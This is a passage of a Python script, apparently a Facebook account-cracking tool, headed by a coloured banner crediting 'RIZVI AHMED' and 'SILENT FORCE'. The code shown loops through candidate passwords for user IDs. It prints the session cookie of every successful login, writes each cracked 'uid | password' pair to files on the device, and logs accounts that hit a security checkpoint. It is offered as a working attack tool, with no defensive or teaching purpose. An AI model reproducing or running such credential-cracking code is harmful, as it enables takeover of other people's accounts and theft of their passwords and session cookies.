...
\033[38;5;196m    ____ _________    _____   
 \033[35;1m     / __ <  /__  / |  / <  /   
  \033[36;1m  / /_/ / /  / /| | / // /    
\033[36;1m  / _, _/ /  / /_| |/ // /     
\033[34;1m/_/ |_/_/  /____/___//_/
      
                              
                                                         
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   :  \033[1;96m RIZVI AHMED
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34m RIZVI AHMED
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       :  \033[1;35m   RIZVI AHMED 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : \033[1;36m  RANDOM 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         :  \033[1;35m  SIlENT FORCE              
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [RIZVI-OK] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCOOKIE= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RIZVI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [RIZVI-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RIZVI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr} SIlENT FORCE  {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
